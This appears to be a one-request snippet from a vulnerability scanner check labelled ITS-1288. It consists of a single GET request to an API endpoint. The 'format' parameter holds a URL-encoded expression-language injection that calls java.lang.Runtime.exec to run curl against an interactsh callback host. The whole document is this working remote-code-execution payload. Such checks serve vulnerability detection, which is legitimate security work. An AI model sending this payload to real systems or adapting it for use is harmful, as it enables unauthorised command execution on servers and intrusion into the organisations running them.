# Vulnerable: ITS-1288
GET /api/v2/featureusage?adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20{{interactsh-url}}')%7d
